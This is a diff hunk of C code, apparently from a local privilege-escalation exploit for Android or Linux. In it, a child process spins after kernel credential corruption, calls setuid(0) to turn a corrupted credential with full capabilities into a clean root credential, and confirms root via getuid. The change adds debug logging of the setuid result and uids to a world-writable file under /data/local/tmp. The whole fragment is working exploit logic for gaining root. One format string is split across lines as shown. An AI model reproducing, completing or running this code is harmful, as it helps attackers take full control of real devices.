@@ -1756,10 +1756,26 @@ static void child_spin_until_cmd(int cmd_r, char *cmd) {
         /* DUALWRITE wake: subjective cred may be init_cred with a
          * corrupted uid but FULL caps — setuid(0) (CAP_SETUID) mints
          * a clean root cred. Plain landings: getuid already 0. */
-        setuid(0);
-        if ((uint32_t)getuid() == 0)
-          break; /* subjective root confirmed by the woken child itself */
-        *flag = 0; /* not root yet: re-arm and keep spinning */
+        {
+          errno = 0;
+          int su = setuid(0);
+          int se = errno;
+          uint32_t gu = (uint32_t)getuid();
+          int wf = open("/data/local/tmp/child_wake.txt",
+                        O_WRONLY | O_CREAT | O_APPEND, 0666);
+          if (wf >= 0) {
+            char wb[128];
+            int wn = snprintf(wb, sizeof(wb),
+                              "wake setuid=%d errno=%d getuid=%u euid=%u
+",
+                              su, se, gu, (uint32_t)geteuid());
+            if (wn > 0) (void)write(wf, wb, (size_t)wn);
+            close(wf);
+          }
+          if (gu == 0)
+            break; /* subjective root confirmed by the woken child itself */
+          *flag = 0; /* not root yet: re-arm and keep spinning */
+        }
       }
       *cmd = 'G';
       return;
